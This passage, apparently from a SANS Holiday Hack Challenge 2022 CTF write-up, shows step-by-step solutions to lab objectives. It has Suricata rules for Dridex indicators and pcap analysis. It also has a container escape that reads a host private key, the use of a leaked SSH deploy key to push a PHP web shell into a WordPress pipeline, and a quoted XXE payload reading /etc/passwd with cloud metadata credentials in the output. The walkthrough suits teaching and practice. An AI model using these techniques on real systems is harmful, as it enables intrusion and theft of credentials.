+<p><img src="Objectives/img/1.3_Windows_Event_Logs_completed.png"></p></section><section class="print-page" id="objectives-1_recover_the_tolkien_ring-1.4_find_the_next_objective"><h1 id="objectives-1_recover_the_tolkien_ring-1.4_find_the_next_objective-recover-the-tolkien-ring">Recover the Tolkien Ring</h1>
+<h2 id="objectives-1_recover_the_tolkien_ring-1.4_find_the_next_objective-14-find-the-next-objective">1.4 Find the Next Objective</h2>
+<p><img src="Objectives/img/1.4_Find_the_Next_Objective.png"></p>
+<p>Talk to <strong>Fitzy Shortstack</strong> for the next objective.</p>
+<h2 id="objectives-1_recover_the_tolkien_ring-1.4_find_the_next_objective-solve">Solve</h2>
+<p><img src="Objectives/img/1.4_Fitzy_Shortstack.png"></p></section><section class="print-page" id="objectives-1_recover_the_tolkien_ring-1.5_suricata_regatta"><h1 id="objectives-1_recover_the_tolkien_ring-1.5_suricata_regatta-recover-the-tolkien-ring">Recover the Tolkien Ring</h1>
+<h2 id="objectives-1_recover_the_tolkien_ring-1.5_suricata_regatta-15-suricata-regatta">1.5 Suricata Regatta</h2>
+<p><img src="Objectives/img/1.5_Suricata_Regatta.png"></p>
+<p>Help detect this kind of malicious activity in the future by writing some Suricata rules. Work with <strong>Dusty Giftwrap</strong> in the Tolkien Ring to get some hints.</p>
+<h2 id="objectives-1_recover_the_tolkien_ring-1.5_suricata_regatta-hints">Hint(s)</h2>
+<p><img src="Objectives/img/1.5_hint1.png"></p>
+<h2 id="objectives-1_recover_the_tolkien_ring-1.5_suricata_regatta-solve">Solve</h2>
+<h3 id="objectives-1_recover_the_tolkien_ring-1.5_suricata_regatta-terminal-answers">Terminal answers</h3>
+<p>Use your investigative analysis skills and the suspicious.pcap file to help develop Suricata rules for the elves!</p>
+<p>There's a short list of rules started in suricata.rules in your home directory.</p>
+<p>First off, the STINC (Santa's Team of Intelligent Naughty Catchers) has a lead for us.
+They have some Dridex indicators of compromise to check out.
+First, please create a Suricata rule to catch DNS lookups for adv.epostoday.uk.
+Whenever there's a match, the alert message (msg) should read Known bad DNS lookup, possible Dridex infection.
+Add your rule to suricata.rules</p>
+<p>Once you think you have it right, run ./rule_checker to see how you've done!
+As you get rules correct, rule_checker will ask for more to be added.</p>
+<p>If you want to start fresh, you can exit the terminal and start again or cp suricata.rules.backup suricata.rules</p>
+<p>Good luck, and thanks for helping save the North Pole!</p>
+<p>1.- Please create a Suricata rule to catch DNS lookups for adv.epostoday.uk.
+Whenever there's a match, the alert message (msg) should read Known bad DNS lookup, possible Dridex infection. </br>
+Source: https://suricata.readthedocs.io/en/suricata-6.0.0/rules/dns-keywords.html</p>
+<p>Solve:</p>
+<pre><code class="language-ruby">$ echo 'alert dns $HOME_NET any -&gt; any any (msg:&quot;Known bad DNS lookup, possible Dridex infection&quot;; dns.query; content:&quot;adv.epostoday.uk&quot;; nocase; sid:1; rev:1;) ' &gt;&gt;suricata.rules
+$ ./rule_checker
+</code></pre>
+<p>2.- STINC thanks you for your work with that DNS record! In this PCAP, it points to 192.185.57.242.
+Develop a Suricata rule that alerts whenever the infected IP address 192.185.57.242 communicates with internal systems over HTTP.
+When there's a match, the message (msg) should read Investigate suspicious connections, possible Dridex infection. </br>
+Source: https://suricata.readthedocs.io/en/suricata-6.0.0/rules/http-keywords.html</p>
+<p>Solve: </p>
+<pre><code class="language-ruby">$ echo 'alert http any any -&gt; any  any (msg:&quot;Investigate suspicious connections, possible Dridex infection&quot;; sid:2; rev:2;)' &gt;&gt; suricata.rules
+$ ./rule_checker
+</code></pre>
+<p>3.- We heard that some naughty actors are using TLS certificates with a specific CN.
+Develop a Suricata rule to match and alert on an SSL certificate for heardbellith.Icanwepeh.nagoya.
+When your rule matches, the message (msg) should read Investigate bad certificates, possible Dridex infection. </br>
+Source: https://suricata.readthedocs.io/en/suricata-6.0.0/rules/tls-keywords.html</p>
+<p>Solve:</p>
+<pre><code class="language-ruby">$ echo 'alert tls any any -&gt; any any (msg:&quot;Investigate bad certificates, possible Dridex infection&quot;; tls.subject:&quot;CN=heardbellith.Icanwepeh.nagoya&quot;; sid:3; rev:3;)' &gt;&gt; suricata.rules
+$ ./rule_checker
+</code></pre>
+<p>4.- OK, one more to rule them all and in the darkness find them.
+Let's watch for one line from the JavaScript: let byteCharacters = atob
+Oh, and that string might be GZip compressed - I hope that's OK!
+Just in case they try this again, please alert on that HTTP data with message Suspicious JavaScript function, possible Dridex infection. </br>
+Source:  https://suricata.readthedocs.io/en/suricata-6.0.0/rules/http-keywords.html#http-protocol</p>
+<p>Solve:</p>
+<pre><code class="language-ruby">$ echo 'alert http any any -&gt; any any (msg: &quot;Suspicious JavaScript function, possible Dridex infection&quot;; flow:established; http.header; content:&quot;Content-Encoding|3a 20|gzip|0d 0a|&quot;; file.data; content:&quot;atob&quot;;' &gt;&gt; suricata.rules
+$ ./rule_checker
+</code></pre>
+<p><img src="Objectives/img/1.5_Suricata_Regatta_sucess_rules.png"></p>
+<p><img src="Objectives/img/1.5_Suricata_Regatta_completed.png"></p></section><h1 class='nav-section-title-end'>Ended: 1. Recover the Tolkien Ring</h1>
+                        <h1 class='nav-section-title' id='section-2-recover-the-elfen-ring'>
+                            2. Recover the Elfen Ring <a class='headerlink' href='#section-2-recover-the-elfen-ring' title='Permanent link'>↵</a>
+                        </h1>
+                        <section class="print-page" id="objectives-2_recover_the_elfen_ring-2.1_clone_with_a_diference"><h1 id="objectives-2_recover_the_elfen_ring-2.1_clone_with_a_diference-recover-the-elfen-ring">Recover the Elfen Ring</h1>
+<h2 id="objectives-2_recover_the_elfen_ring-2.1_clone_with_a_diference-21-clone-with-a-diference">2.1 Clone with a Diference</h2>
+<p><img src="Objectives/img/2.1_Clone_with_a_Diference.png"></p>
+<p>Clone a code repository. Get hints for this challenge from <strong>Bow Ninecandle</strong> in the Elfen Ring.</p>
+<p><img src="Objectives/img/2.1_Bow_Ninecandle.png"></p>
+<h2 id="objectives-2_recover_the_elfen_ring-2.1_clone_with_a_diference-hints">Hint(s)</h2>
+<p><img src="Objectives/img/2.1_hint1.png"></p>
+<h2 id="objectives-2_recover_the_elfen_ring-2.1_clone_with_a_diference-solve">Solve</h2>
+<pre><code class="language-ruby">ANSWER: rununtoanswer maintainers
+</code></pre>
+<h3 id="objectives-2_recover_the_elfen_ring-2.1_clone_with_a_diference-terminal-answers">Terminal answers</h3>
+<pre><code class="language-ruby">$ git clone git@haugfactory.com:asnowball/aws_scripts.git 
+$ rununtoanswer maintainers
+</code></pre>
+<p>Alternative solve , just read directly the README.md file here: </p>
+<pre><code class="language-ruby">https://haugfactory.com/orcadmin/aws_scripts/-/blob/main/README.md
+</code></pre>
+<p><img src="Objectives/img/2.1_Clone_with_a_Diference_solve.png"></p>
+<p><img src="Objectives/img/2.1_Clone_with_a_Diference_completed.png"></p></section><section class="print-page" id="objectives-2_recover_the_elfen_ring-2.2_find_the_next_objective"><h1 id="objectives-2_recover_the_elfen_ring-2.2_find_the_next_objective-recover-the-elfen-ring">Recover the Elfen Ring</h1>
+<h2 id="objectives-2_recover_the_elfen_ring-2.2_find_the_next_objective-22-find-the-next-objective">2.2 Find the Next Objective</h2>
+<p><img src="Objectives/img/2.2_Find_the_Next_Objective.png"></p>
+<p>Talk to <strong>Bow Ninecandle</strong> for the next objective.</p>
+<h2 id="objectives-2_recover_the_elfen_ring-2.2_find_the_next_objective-solve">Solve</h2>
+<p><img src="Objectives/img/2.2_Bow_Ninecandle.png"></p></section><section class="print-page" id="objectives-2_recover_the_elfen_ring-2.3_prison_escape"><h1 id="objectives-2_recover_the_elfen_ring-2.3_prison_escape-recover-the-elfen-ring">Recover the Elfen Ring</h1>
+<h2 id="objectives-2_recover_the_elfen_ring-2.3_prison_escape-23-prison-escape">2.3 Prison Escape</h2>
+<p><img src="Objectives/img/2.3_Prison_Escape.png"></p>
+<p>Escape from a container. Get hints for this challenge from <strong>Bow Ninecandle</strong> in the Elfen Ring. What hex string appears in the host file <strong>/home/jailer/.ssh/jail.key.priv</strong>?</p>
+<h2 id="objectives-2_recover_the_elfen_ring-2.3_prison_escape-hints">Hint(s)</h2>
+<p><img src="Objectives/img/2.3_hint1.png"></p>
+<p><img src="Objectives/img/2.3_hint2.png"></p>
+<h2 id="objectives-2_recover_the_elfen_ring-2.3_prison_escape-solve">Solve</h2>
+<pre><code class="language-ruby">ANSWER: 082bb339ec19de4935867
+</code></pre>
+<h3 id="objectives-2_recover_the_elfen_ring-2.3_prison_escape-terminal-answers">Terminal answers</h3>
+<pre><code class="language-ruby">grinchum-land:/tmp# fdisk -l 
+Disk /dev/vda: 2048 MB, 2147483648 bytes, 4194304 sectors
+2048 cylinders, 64 heads, 32 sectors/track
+Units: sectors of 1 * 512 = 512 bytes
+
+Disk /dev/vda doesn't contain a valid partition table
+
+grinchum-land:/tmp# mkdir -p /mnt/hola
+grinchum-land:/tmp# mount /dev/vda /mnt/hola
+grinchum-land:/tmp# cd /mnt/hola/
+grinchum-land:/mnt/hola# ls 
+bin   dev  home  lib32  libx32      media  opt   root  sbin  sys  usr
+boot  etc  lib   lib64  lost+found  mnt    proc  run   srv   tmp  var
+grinchum-land:/mnt/hola# cd home/
+grinchum-land:/mnt/hola/home# ls 
+jailer
+grinchum-land:/mnt/hola/home# cd jailer/
+grinchum-land:/mnt/hola/home/jailer# ls 
+grinchum-land:/mnt/hola/home/jailer# ls -la 
+total 12
+drwxr-xr-x 3 root root 4096 Dec  1 19:12 .
+drwxr-xr-x 3 root root 4096 Dec  1 19:12 ..
+drwxr-xr-x 2 root root 4096 Dec  1 19:12 .ssh
+grinchum-land:/mnt/hola/home/jailer# 
+
+grinchum-land:/mnt/hola/home/jailer# cd .ssh/
+grinchum-land:/mnt/hola/home/jailer/.ssh# ls 
+jail.key.priv  jail.key.pub
+grinchum-land:/mnt/hola/home/jailer/.ssh# cat jail.key.priv
+</code></pre>
+<p><img src="Objectives/img/2.3_Prison_Escape_solve_01.png"></p>
+<p><img src="Objectives/img/2.3_Prison_Escape_solve_02.png"></p>
+<p><img src="Objectives/img/2.3_Prison_Escape_completed.png"></p></section><section class="print-page" id="objectives-2_recover_the_elfen_ring-2.4_find_the_next_objective"><h1 id="objectives-2_recover_the_elfen_ring-2.4_find_the_next_objective-recover-the-elfen-ring">Recover the Elfen Ring</h1>
+<h2 id="objectives-2_recover_the_elfen_ring-2.4_find_the_next_objective-24-find-the-next-objective">2.4 Find the Next Objective</h2>
+<p><img src="Objectives/img/2.4_Find_the_Next_Objective.png"></p>
+<p>Talk to <strong>Tinsel Upatree</strong> for the next objective.</p>
+<h2 id="objectives-2_recover_the_elfen_ring-2.4_find_the_next_objective-solve">Solve</h2>
+<p><img src="Objectives/img/2.4_Tinsel.png"></p></section><section class="print-page" id="objectives-2_recover_the_elfen_ring-2.5_jolly_ci_cd"><h1 id="objectives-2_recover_the_elfen_ring-2.5_jolly_ci_cd-recover-the-elfen-ring">Recover the Elfen Ring</h1>
+<h2 id="objectives-2_recover_the_elfen_ring-2.5_jolly_ci_cd-25-jolly-cicd">2.5 Jolly CI/CD</h2>
+<p><img src="Objectives/img/2.5_Jolly_CI_CD.png"></p>
+<p>Exploit a CI/CD pipeline. Get hints for this challenge from <strong>Tinsel Upatree</strong> in the Elfen Ring.</p>
+<h2 id="objectives-2_recover_the_elfen_ring-2.5_jolly_ci_cd-hints">Hint(s)</h2>
+<p><img src="Objectives/img/2.5_hint1.png"></p>
+<p><img src="Objectives/img/2.5_hint2.png"></p>
+<h2 id="objectives-2_recover_the_elfen_ring-2.5_jolly_ci_cd-solve">Solve</h2>
+<pre><code class="language-ruby">ANSWER: oI40zIuCcN8c3MhKgQjOMN8lfYtVqcKT 
+</code></pre>
+<h3 id="objectives-2_recover_the_elfen_ring-2.5_jolly_ci_cd-terminal-answers">Terminal answers</h3>
+<p><img src="Objectives/img/2.5_terminal_00.png"></p>
+<p>1.- Clone the gitlab repo available:</p>
+<pre><code class="language-ruby">grinchum-land:~$ git clone http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git
+Cloning into 'wordpress.flag.net.internal'...
+remote: Enumerating objects: 10195, done.
+remote: Total 10195 (delta 0), reused 0 (delta 0), pack-reused 10195
+Receiving objects: 100% (10195/10195), 36.49 MiB | 20.74 MiB/s, done.
+Resolving deltas: 100% (1799/1799), done.
+Updating files: 100% (9320/9320), done.
+grinchum-land:~$ 
+</code></pre>
+<p>2.- List the commit log available:</p>
+<pre><code class="language-ruby">grinchum-land:~/wordpress.flag.net.internal$ git log | more
+commit 37b5d575bf81878934adb937a4fff0d32a8da105
+Author: knee-oh &lt;sporx@kringlecon.com&gt;
+Date:   Wed Oct 26 13:58:15 2022 -0700
+[../snip]
+</code></pre>
+<p>3.- Notice the commit with ID abdea0ebb21b156c01f7533cea3b895c26198c98 is exposing the SSH keys, extract those keys:</p>
+<pre><code class="language-ruby">grinchum-land:~/wordpress.flag.net.internal$ git show abdea0ebb21b156c01f7533cea3b895c26198c98:.ssh/.deploy.pub
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP7AsdI7HOvk4piOcwLZfDotPqBj2tDq9NBdTUkbZBri sporx@kringlecon.com
+
+grinchum-land:~/wordpress.flag.net.internal$ git show abdea0ebb21b156c01f7533cea3b895c26198c98:.ssh/.deploy 
+
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+QyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4gAAAJiQFTn3kBU5
+9wAAAAtzc2gtZWQyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4g
+AAAEBL0qH+iiHi9Khw6QtD6+DHwFwYc50cwR0HjNsfOVXOcv7AsdI7HOvk4piOcwLZfDot
+PqBj2tDq9NBdTUkbZBriAAAAFHNwb3J4QGtyaW5nbGVjb24uY29tAQ==
+-----END OPENSSH PRIVATE KEY-----
+</code></pre>
+<p>4.- Add those keys into .ssh grinchum profile:  </p>
+<pre><code class="language-ruby">grinchum-land:~$ mkdir .ssh &amp;&amp; touch .ssh/id_rsa.pub &amp;&amp; touch .ssh/id_rsa
+grinchum-land:~$ echo ' ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP7AsdI7HOvk4piOcwLZfDotPqBj2tDq9NBdTUkbZBri sporx@kringlecon.com' &gt;&gt; .ssh/id_rsa.pub
+grinchum-land:~$ echo -n ' private key here '' &lt;- do manually due format errors 
+grinchum-land:~$ chmod 400 .ssh/id_rsa &amp;&amp; chmod 400 .ssh/id_rsa.pub
+grinchum-land:~/.ssh$ eval &quot;$(ssh-agent -s)&quot;
+Agent pid 460
+</code></pre>
+<p>5.- Test your connectivity to the server (note: gitlab target are not allowed ssh connections)</p>
+<pre><code class="language-ruby">grinchum-land:~$ ssh -T git@gitlab.flag.net.internal 
+Welcome to GitLab, @knee-oh!
+</code></pre>
+<p>6.- Add the global git config for user and private keys:</p>
+<pre><code class="language-ruby">grinchum-land:~/wordpress.flag.net.internal$ git config --global user.email &quot;sporx@kringlecon.com&quot;
+grinchum-land:~/wordpress.flag.net.internal$ git config --global user.name &quot;knee-oh&quot;
+grinchum-land:~/wordpress.flag.net.internal$ git config core.sshCommand 'ssh -i /home/samways/.ssh/id_rsa'
+</code></pre>
+<p>7.- Test your gitlab permissions:</p>
+<pre><code class="language-ruby">grinchum-land:~/wordpress.flag.net.internal$ touch alex2.txt
+grinchum-land:~/wordpress.flag.net.internal$ echo 'anoter file' &gt;&gt; alex2.txt 
+grinchum-land:~/wordpress.flag.net.internal$ git add . 
+grinchum-land:~/wordpress.flag.net.internal$ git commit -a --allow-empty-message -m 'My test2'
+grinchum-land:~/wordpress.flag.net.internal$ git push
+grinchum-land:~/wordpress.flag.net.internal$ git log
+
+commit 64c3d6af84d1c4b5955fd923d8eef0183419dc33 (HEAD -&gt; main)
+Author: knee-oh &lt;sporx@kringlecon.com&gt;
+Date:   Mon Dec 12 01:19:53 2022 +0000
+
+    Erased by Alex &lt;-- Voila ! good 
+
+commit cc2df0953e632492b7782074d44ab9d47ea912d3 (origin/main, origin/HEAD)
+Author: knee-oh &lt;sporx@kringlecon.com&gt;
+Date:   Mon Dec 12 01:14:21 2022 +0000
+
+    My test2 &lt;-- Voila ! good 
+</code></pre>
+<p>8.- Modify some file e.g "readme.html" from wordpress portal to see if the changes are reflected for Live Environment: </p>
+<pre><code class="language-ruby">rinchum-land:~/wordpress.flag.net.internal$ echo 'alt3kx was here' &gt;&gt; readme.html
+grinchum-land:~/wordpress.flag.net.internal$ git add . 
+grinchum-land:~/wordpress.flag.net.internal$ git commit -a --allow-empty-message -m 'readme.html modified' 
+grinchum-land:~/wordpress.flag.net.internal$ git push 
+</code></pre>
+<p>9.- Call the portal using curl command with full path "readme.html", find the string previously added into source code:</p>
+<pre><code class="language-ruby">$ curl http://wordpress.flag.net.internal/readme.html
+[../snip]
+alt3kx was here! 
+&lt;/body&gt;
+&lt;/html&gt;
+[../snip]
+</code></pre>
+<p>10.- Wordpress porta allowed php files, upload the phpshell as backdoor into plugins directory: </p>
+<pre><code class="language-ruby">grinchum-land:~/wordpress.flag.net.internal/wp-content/plugins/shell$ pwd
+/home/samways/wordpress.flag.net.internal/wp-content/plugins/shell
+grinchum-land:~/wordpress.flag.net.internal/wp-content/plugins/shell$ ls -la 
+total 16
+drwxr-xr-x  2 samways users 4096 Dec 12 02:21 .
+drwxr-xr-x 19 samways users 4096 Dec 12 02:10 ..
+-rw-r--r--  1 samways users 2698 Dec 12 02:09 shell.php
+-rw-r--r--  1 samways users  302 Dec 12 02:21 shell2.php
+grinchum-land:~/wordpress.flag.net.internal/wp-content/plugins/shell$ cat shell2.php 
+
+---shell2.php--- 
+&lt;html&gt;
+&lt;body&gt;
+&lt;form method=&quot;GET&quot; name=&quot;&lt;?php echo basename($_SERVER['PHP_SELF']); ?&gt;&quot;&gt;
+&lt;input type=&quot;TEXT&quot; name=&quot;cmd&quot; autofocus id=&quot;cmd&quot; size=&quot;80&quot;&gt;
+&lt;input type=&quot;SUBMIT&quot; value=&quot;Execute&quot;&gt;
+&lt;/form&gt;
+&lt;pre&gt;
+&lt;?php
+    if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd']);
+    }
+?&gt;
+&lt;/pre&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+---shell2.php--- 
+
+grinchum-land:~/wordpress.flag.net.internal/wp-content/plugins/shell$
+</code></pre>
+<p>11.- Commit the changes for wordpress portal Live Environment:</p>
+<pre><code class="language-ruby">grinchum-land:~/wordpress.flag.net.internal$ git add . 
+grinchum-land:~/wordpress.flag.net.internal$ git commit -a  -m 'shell' 
+grinchum-land:~/wordpress.flag.net.internal$ git push 
+</code></pre>
+<p><img src="Objectives/img/2.5_terminal_10.png"></p>
+<p>12.- Call the portal using curl command with full path of phpshell e.g "/wp-content/plugins/shell/shell2.php?cmd=ls+/" </p>
+<pre><code class="language-ruby">grinchum-land:~/wordpress.flag.net.internal$ curl -v &quot;http://wordpress.flag.net.internal/wp-content/plugins/shell/shell2.php?cmd=ls+/&quot;
+</code></pre>
+<p><img src="Objectives/img/2.5_terminal_11.png"></p>
+<p>13.- Now just call the flag.txt file using curl command with full path e.g "wp-content/plugins/shell/shell2.php?cmd=cat+/flag.txt" </p>
+<pre><code class="language-ruby">grinchum-land:~/wordpress.flag.net.internal$ curl -v &quot;http://wordpress.flag.net.internal/wp-content/plugins/shell/shell2.php?cmd=cat+/flag.txt&quot;
+</code></pre>
+<p>14.- See the flag.txt file content</p>
+<pre><code class="language-ruby">FLAG: oI40zIuCcN8c3MhKgQjOMN8lfYtVqcKT
+</code></pre>
+<p><img src="Objectives/img/2.5_Jolly_CI_CD_solve.png"></p>
+<p><img src="Objectives/img/2.5_Jolly_CI_CD_completed.png"></p></section><h1 class='nav-section-title-end'>Ended: 2. Recover the Elfen Ring</h1>
+                        <h1 class='nav-section-title' id='section-3-recover-the-web-ring'>
+                            3. Recover the Web Ring <a class='headerlink' href='#section-3-recover-the-web-ring' title='Permanent link'>↵</a>
+                        </h1>
+                        <section class="print-page" id="objectives-3_recover_the_web_ring-3.1_naughty_ip"><h1 id="objectives-3_recover_the_web_ring-3.1_naughty_ip-recover-the-web-ring">Recover the Web Ring</h1>
+<h2 id="objectives-3_recover_the_web_ring-3.1_naughty_ip-31-naughty-ip">3.1 Naughty IP</h2>
+<p><img src="Objectives/img/3.1_Naughty_IP.png"></p>
+<p>Use the artifacts https://storage.googleapis.com/hhc22_player_assets/boriaArtifacts.zip from <strong>Alabaster Snowball</strong> to analyze this attack on the Boria mines. Most of the traffic to this site is nice, but one IP address is being naughty! Which is it? Visit <strong>Sparkle Redberry</strong> in the Tolkien Ring for hints.</p>
+<h2 id="objectives-3_recover_the_web_ring-3.1_naughty_ip-hints">Hint(s)</h2>
+<p><img src="Objectives/img/3.1_hint1.png"></p>
+<h2 id="objectives-3_recover_the_web_ring-3.1_naughty_ip-solve">Solve</h2>
+<pre><code class="language-ruby">ANSWER: 18.222.86.32
+</code></pre>
+<h3 id="objectives-3_recover_the_web_ring-3.1_naughty_ip-terminal-answers">Terminal answers</h3>
+<pre><code class="language-ruby">Filter: ip.src==18.222.86.32 &amp;&amp; ip.dst==10.12.42.16
+Observe the top talker HTTP IP addresses 18.222.86.32
+</code></pre>
+<p><img src="Objectives/img/3.1_Naughty_IP_solve.png"></p></section><section class="print-page" id="objectives-3_recover_the_web_ring-3.2_credential_mining"><h1 id="objectives-3_recover_the_web_ring-3.2_credential_mining-recover-the-web-ring">Recover the Web Ring</h1>
+<h2 id="objectives-3_recover_the_web_ring-3.2_credential_mining-32-credential-mining">3.2 Credential Mining</h2>
+<p><img src="Objectives/img/3.2_Credential_Mining.png"></p>
+<p>The first attack is a brute force https://owasp.org/www-community/attacks/Brute_force_attack login. What's the first username tried? </p>
+<h2 id="objectives-3_recover_the_web_ring-3.2_credential_mining-hints">Hint(s)</h2>
+<p><img src="Objectives/img/3.2_hint1.png"></p>
+<h2 id="objectives-3_recover_the_web_ring-3.2_credential_mining-solve">Solve</h2>
+<pre><code class="language-ruby">ANSWER: alice
+</code></pre>
+<h3 id="objectives-3_recover_the_web_ring-3.2_credential_mining-terminal-answers">Terminal answers</h3>
+<pre><code class="language-ruby">$ tshark -r victim.pcap -Y &quot;http.request.method == POST&quot; -T fields -e text  | more
+</code></pre>
+<p><img src="Objectives/img/3.2_Credential_Mining_solve.png"></p>
+<p><img src="Objectives/img/3.2_Credential_Mining_completed.png"></p></section><section class="print-page" id="objectives-3_recover_the_web_ring-3.3_404_ftw"><h1 id="objectives-3_recover_the_web_ring-3.3_404_ftw-recover-the-web-ring">Recover the Web Ring</h1>
+<h2 id="objectives-3_recover_the_web_ring-3.3_404_ftw-33-404-ftw">3.3 404 FTW</h2>
+<p><img src="Objectives/img/3.3_404_FTW.png"></p>
+<p>The next attack is forced browsing https://owasp.org/www-community/attacks/Forced_browsing where the naughty one is guessing URLs. What's the first successful URL path in this attack? </p>
+<h2 id="objectives-3_recover_the_web_ring-3.3_404_ftw-hints">Hint(s)</h2>
+<p><img src="Objectives/img/3.3_hint1.png"></p>
+<h2 id="objectives-3_recover_the_web_ring-3.3_404_ftw-solve">Solve</h2>
+<pre><code class="language-ruby">ANSWER: /proc 
+</code></pre>
+<h3 id="objectives-3_recover_the_web_ring-3.3_404_ftw-terminal-answers">Terminal answers</h3>
+<pre><code class="language-ruby">$ tshark -r victim.pcap -Y &quot;http.request.method == GET&quot; -T fields -e text  | sort | uniq -c | sort -nr | head
+</code></pre>
+<p><img src="Objectives/img/3.3_404_FTW_solve.png"></p></section><section class="print-page" id="objectives-3_recover_the_web_ring-3.4_imds_xxe_and_other_abbreviations"><h1 id="objectives-3_recover_the_web_ring-3.4_imds_xxe_and_other_abbreviations-recover-the-web-ring">Recover the Web Ring</h1>
+<h2 id="objectives-3_recover_the_web_ring-3.4_imds_xxe_and_other_abbreviations-34-imds-xxe-and-other-abbreviations">3.4 IMDS, XXE, and Other Abbreviations</h2>
+<p><img src="Objectives/img/3.4_IMDS_XXE_and_Other_Abbreviations.png"></p>
+<p>The last step in this attack was to use XXE https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing to get secret keys from the IMDS service. What URL did the attacker force the server to fetch?</p>
+<h2 id="objectives-3_recover_the_web_ring-3.4_imds_xxe_and_other_abbreviations-hints">Hint(s)</h2>
+<p><img src="Objectives/img/3.4_hint1.png"></p>
+<h2 id="objectives-3_recover_the_web_ring-3.4_imds_xxe_and_other_abbreviations-solve">Solve</h2>
+<pre><code class="language-ruby">ANSWER: http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance 
+</code></pre>
+<h3 id="objectives-3_recover_the_web_ring-3.4_imds_xxe_and_other_abbreviations-terminal-answers">Terminal answers</h3>
+<p>1.- See pcap filter by protocol observe in detail the request with HTTP/XML</p>
+<pre><code class="language-ruby">http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance
+
+GET /latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance HTTP/1.0
+Host: 169.254.169.254
+Accept-Encoding: gzip
+
+HTTP/1.0 200 OK
+Accept-Ranges: bytes
+Content-Length: 1514
+Content-Type: text/plain
+Date: Wed, 05 Oct 2022 16:48:57 GMT
+Last-Modified: Wed, 05 Oct 2022 16:42:35 GMT
+Connection: close
+Server: EC2ws
+
+{
+  &quot;Code&quot; : &quot;Success&quot;,
+  &quot;LastUpdated&quot; : &quot;2022-10-05T16:43:21Z&quot;,
+  &quot;Type&quot; : &quot;AWS-HMAC&quot;,
+  &quot;AccessKeyId&quot; : &quot;ASIAV4AVRXQVJ267LD2Q&quot;,
+  &quot;SecretAccessKey&quot; : &quot;OpGR4v70ygZ3RFf4WTzjNL45pQayRwZgBUgd0LJT&quot;,
+  &quot;Token&quot; : &quot;IQoJb3JpZ2luX2VjECEaCXVzLWVhc3QtMiJHMEUCIHDsZXiUuHIUrLNH5pAeMiv4aUMVIScjwbo1E9LctQ3rAiEA819eJ24mILbxM3eELK2xrgskHxsRmrza/jIj3y96/sgqsgQI2v//////////ARADGgw0MDM3NzIxMjgyOTgiDMAdG5EGamJ4Z2FwyiqGBPy+CL9AfXIGfLBBDCNkCyl5WOMN7owHr84k+hz4XZYBUp7/+KFZgEiKARroMuD6ofdNRvAj7dQ1/wFxeR6wezUPUkHqtc303oTBY7eTk5EQXClpKsmV1l25QAfD0DOL6FPxpjLPug0AbDFlIhjUeImvk3NBWiUHtXptrJH2ksSaQqU2DBPkkQ4IjMBMbLj0ZdJVWaiUy9sf5ecc2d/qVQU1c6SrYLg0HpyuH9brqm0zuv8/tR17Y/Jo2aNeNGX1wvyb5jP1FcQteypV6IqKIUUCADJ7chYeMypMlwV77phvrZco921O6MV+JlhSIomuzFRLdvzD+RP8DyLZeYZ65vKzr6h0yc+XIHOCT+P01pWQgfZBtvfCJKLKqwTMEbIr/i/xgGmHoCTzx6m38kd4EZvGXZMp3EEasdnqTtKLOR6JFAAlW8SoxOKRL1MshK3SUmYvWnMoLKCotPwyJeAMHEHuZipNMiZ2gbN//PMbUBnPjNVFBP4SfHaTv7EHzHNpTl5toy8qlPyxE0yLbh5a//DF5wJQE6UKfXWlQhk9/NVM7QAAzEzWPiFTp8ajRIDjPoprVlX3yUaTUHOH8PwMtURCJLl0sOQaJtRGWEMrH52ls5e83pm0ta8257vu8HyTR7zgc/7a0ZsoxetlsB7VYIKyXnETO7SMniTO8R/yE1Wn9qAoWp/jMPvn9pkGOo8CLegclGA49hB/LRr/V1bXEyIIRg5Zn93xXvccMX5QyKGVSRghNOVGn/cCglDWc9zSRFRlZ4tHblVi1v8021J04REPR69FDuVvpUzEDJfDF1u4XwYGsp7uuuIngiiegP56H5nSYjmpBfyIURwgNvsz6ptpUvplGCxOvBJcKeyborHJDKG40QRXsLpOgB8NTKhgaFNxO7PjA/YrT7g1rYS7xNrKzVIK4tTwxWB5zN5JAQ3pVRp2JB8Q1ng3qsj3UPfZ3O3JjY4U+rrBKPEHIw9B+Pz6kffOu73aPKgo333w/hd9U4slj74JQXPhO9jCYpAF1bLdS/If20Ed6HvGcAONep0A/FrtZ62EWX4HmeYZ4A==&quot;,
+  &quot;Expiration&quot; : &quot;2022-10-05T23:00:40Z&quot;
+  ```
+
+Extra info attacker: 
+
+```ruby
+POST /proc HTTP/1.1
+Host: www.toteslegit.us
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.37) Gecko/20100101 Firefox/12.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Cookie: SiteCookie=eyJjb21wYW55IjoiTGVnaXRCcmVhZCIsImxldmVsIjoiYWRtaW4iLCJ1c2VyIjoiYm9iIn0.Yz21Ew.idT7R5CEcAB_uJD221WwmKYG5QM
+Content-Type: application/xml
+Content-Length: 146
+
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ELEMENT foo ANY &gt;
+  &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;
+&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
+HTTP/1.1 200 OK
+Server: Werkzeug/2.2.2 Python/3.8.10
+Date: Wed, 05 Oct 2022 16:48:32 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 1875
+Connection: close
+
+&lt;html&gt;&lt;body&gt;
